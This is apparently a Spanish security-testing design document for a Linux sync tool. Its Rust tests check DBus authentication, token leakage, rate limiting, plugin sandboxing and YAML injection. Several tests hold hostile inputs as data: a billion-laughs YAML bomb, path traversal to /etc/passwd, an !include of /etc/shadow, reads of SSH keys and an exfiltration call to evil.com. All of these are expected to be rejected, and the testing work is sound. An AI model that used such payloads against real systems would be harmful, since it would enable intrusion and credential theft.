# Testing de Seguridad

> **Ubicación:** `06-Testing/09-testing-seguridad.md`
> **Relacionado:** [Estrategia Testing](01-estrategia-testing.md), [Configuración YAML](../05-Implementacion/05-configuracion-yaml.md)

---

## Introducción

Este documento consolida las estrategias y casos de prueba de seguridad derivados del análisis de riesgos arquitectónico. Cada riesgo de seguridad (serie D) tiene testing específico.

---

## Riesgos de Seguridad Cubiertos

| ID | Riesgo | Prioridad | Componente |
|----|--------|-----------|------------|
| D1 | DBus sin autenticación | P0 | DBus/PolicyKit |
| D2 | Exposición de tokens | P0 | Token storage |
| D3 | DBus sin rate limiting | P1 | DBus service |
| D4 | Plugin sin sandbox | P1 | Plugin system |
| D5 | YAML injection | P0 | Config loader |

---

## D1: Testing de Autenticación DBus

### Test Cases

```rust
#[tokio::test]
async fn test_polkit_required_for_sensitive_ops() {
    let client = MockDbusClient::new_unauthorized();
    
    // Operaciones sensibles deben requerir autenticación
    let result = client.call_method("RemoveAccount", "test-account").await;
    
    assert!(matches!(result, Err(DbusError::PolkitDenied { .. })));
}

#[tokio::test]
async fn test_unauthorized_process_rejected() {
    // Simular proceso sin PolicyKit agent
    let client = UnauthorizedClient::new();
    
    let result = client.add_account("onedrive").await;
    
    assert!(matches!(result, Err(DbusError::NotAuthorized)));
}

#[tokio::test]
async fn test_authorized_user_allowed() {
    let client = MockDbusClient::new_with_polkit_agent();
    
    // Usuario con sesión activa puede realizar operaciones normales
    let status = client.get_sync_status().await;
    
    assert!(status.is_ok());
}
```

### Verificación Manual

```bash
# Verificar que PolicyKit policy está instalado
ls /usr/share/polkit-1/actions/org.enigmora.lnxdrive.policy

# Probar con pkcheck
pkcheck --action-id org.enigmora.lnxdrive.sensitive \
        --process $$ --allow-user-interaction
```

---

## D2: Testing de Exposición de Tokens

### Test Cases

```rust
#[test]
fn test_no_tokens_in_dbus_traffic() {
    let interceptor = DbusMessageInterceptor::new();
    
    // Ejecutar operación que usa tokens internamente
    let _result = sync_now();
    
    // Verificar que ningún mensaje contiene tokens
    for message in interceptor.captured_messages() {
        assert!(!message.contains("eyJ"));  // JWT prefix
        assert!(!message.contains("Bearer"));
        assert!(!message.contains_pattern(r"[A-Za-z0-9-_]{20,}"));
    }
}

#[test]
fn test_tokens_stored_in_keyring() {
    let storage = TokenStorage::new();
    storage.save_tokens(&test_tokens()).unwrap();
    
    // Verificar que están en keyring, no en archivo
    let config_dir = dirs::config_dir().unwrap().join("lnxdrive");
    
    for entry in walkdir::WalkDir::new(&config_dir) {
        let entry = entry.unwrap();
        if entry.file_type().is_file() {
            let contents = std::fs::read_to_string(entry.path()).unwrap_or_default();
            assert!(!contents.contains("access_token"));
            assert!(!contents.contains("refresh_token"));
        }
    }
}

#[test]
fn test_token_memory_zeroed_on_drop() {
    use zeroize::Zeroize;
    
    let token = SecretToken::new("super_secret_token");
    let ptr = token.as_ptr();
    
    drop(token);
    
    // Verificar que la memoria fue limpiada
    unsafe {
        let slice = std::slice::from_raw_parts(ptr, 18);
        assert!(slice.iter().all(|&b| b == 0));
    }
}
```

---

## D3: Testing de Rate Limiting DBus

### Test Cases

```rust
#[tokio::test]
async fn test_rate_limit_blocks_flooding() {
    let client = DbusClient::connect().await.unwrap();
    
    // Enviar 200 requests rápidos (límite es 100/seg)
    let mut results = Vec::new();
    for _ in 0..200 {
        results.push(client.get_status().await);
    }
    
    // Al menos algunos deben ser rechazados
    let rejected = results.iter().filter(|r| r.is_err()).count();
    assert!(rejected > 50, "Expected rate limiting, got {} rejections", rejected);
}

#[tokio::test]
async fn test_legitimate_client_not_affected() {
    let client = DbusClient::connect().await.unwrap();
    
    // Uso normal: 1 request cada 100ms
    for _ in 0..20 {
        let result = client.get_status().await;
        assert!(result.is_ok());
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
}
```

---

## D4: Testing de Sandbox de Plugins

### Test Cases

```rust
#[test]
fn test_plugin_cannot_access_other_accounts() {
    let plugin = load_plugin("dropbox-provider");
    
    // Plugin solo debe poder acceder a su cuenta
    let onedrive_data = plugin.try_read_account_data("onedrive-account-1");
    assert!(matches!(onedrive_data, Err(PluginError::AccessDenied)));
}

#[test]
fn test_plugin_filesystem_restricted() {
    let plugin = load_plugin_sandboxed("test-provider");
    
    // Plugin no puede acceder fuera de su directorio
    let result = plugin.read_file("/etc/passwd");
    assert!(matches!(result, Err(PluginError::SandboxViolation)));
    
    let result = plugin.read_file("~/.ssh/id_rsa");
    assert!(matches!(result, Err(PluginError::SandboxViolation)));
}

#[test]
fn test_plugin_network_restricted() {
    let plugin = load_plugin_sandboxed("malicious-provider");
    
    // Plugin solo puede conectar a su API endpoint declarado
    let result = plugin.connect_to("https://evil.com/exfiltrate");
    assert!(matches!(result, Err(PluginError::NetworkDenied)));
}
```

---

## D5: Testing de YAML Injection

### Test Cases

```rust
#[test]
fn test_billion_laughs_rejected() {
    let malicious_yaml = r#"
        a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
        b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
        c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
        d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
        e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
        f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
    "#;
    
    let result = load_config_from_string(malicious_yaml);
    assert!(matches!(result, Err(ConfigError::RecursionLimit | ConfigError::InvalidYaml(_))));
}

#[test]
fn test_path_traversal_blocked() {
    let config_yaml = r#"
        lnxdrive:
          version: 1
          sync:
            root: "../../../etc/passwd"
    "#;
    
    let result = load_config_from_string(config_yaml);
    assert!(matches!(result, Err(ConfigError::PathTraversal { .. })));
}

#[test]
fn test_config_size_limit() {
    let huge_config = "x: ".to_string() + &"a".repeat(100 * 1024);  // 100KB
    
    let result = load_config_from_string(&huge_config);
    assert!(matches!(result, Err(ConfigError::FileTooLarge { .. })));
}

#[test]
fn test_external_entity_rejected() {
    let config_with_entity = r#"
        lnxdrive:
          version: 1
          # Esto no debería funcionar con serde_yaml
          secret: !include /etc/shadow
    "#;
    
    let result = load_config_from_string(config_with_entity);
    // serde_yaml no soporta !include, debería fallar o ignorar
    assert!(result.is_err() || result.unwrap().secret.is_none());
}
```

---

## Herramientas de Fuzzing

### Setup de cargo-fuzz

```bash
# Instalar cargo-fuzz
cargo install cargo-fuzz

# Crear target de fuzzing para config loader
cargo fuzz init
cargo fuzz add config_loader

# Ejecutar fuzzing
cargo +nightly fuzz run config_loader -- -max_len=10240
```

### Fuzz Target

```rust
// fuzz/fuzz_targets/config_loader.rs
#![no_main]
use libfuzzer_sys::fuzz_target;
use lnxdrive_core::config::load_config_from_bytes;

fuzz_target!(|data: &[u8]| {
    // No debería crashear ni consumir memoria excesiva
    let _ = load_config_from_bytes(data);
});
```

---

## Checklist de Seguridad Pre-Release

- [ ] Todos los tests de seguridad pasan
- [ ] Fuzzing ejecutado por mínimo 1 hora sin crashes
- [ ] PolicyKit policy instalado y funcional
- [ ] Tokens almacenados en keyring, no en archivos
- [ ] DBus rate limiting activo
- [ ] Plugins ejecutan en sandbox
- [ ] Config loader rechaza YAML malicioso
- [ ] No hay secrets en logs o mensajes de error
- [ ] Audit log registra intentos de acceso denegados

---

## Metricas de Seguridad

```prometheus
# HELP lnxdrive_security_events_total Security-related events
# TYPE lnxdrive_security_events_total counter
lnxdrive_security_events_total{type="auth_denied"} 5
lnxdrive_security_events_total{type="rate_limited"} 23
lnxdrive_security_events_total{type="sandbox_violation"} 0
lnxdrive_security_events_total{type="config_validation_failed"} 2

# HELP lnxdrive_security_scan_last_run_timestamp Timestamp of last security scan
# TYPE lnxdrive_security_scan_last_run_timestamp gauge
lnxdrive_security_scan_last_run_timestamp 1738340400
```

---

## Referencias

- [TRACE-risks-mitigations.md](../.devtrail/02-design/risk-analysis/TRACE-risks-mitigations.md) - Matriz de riesgos
- [RISK-002-security-vulns.md](../.devtrail/02-design/risk-analysis/RISK-002-security-vulns.md) - Análisis de vulnerabilidades
- [Configuración YAML](../05-Implementacion/05-configuracion-yaml.md) - Validación de configuración
- [Comunicación DBus](../08-Distribucion/02-comunicacion-dbus.md) - Seguridad DBus
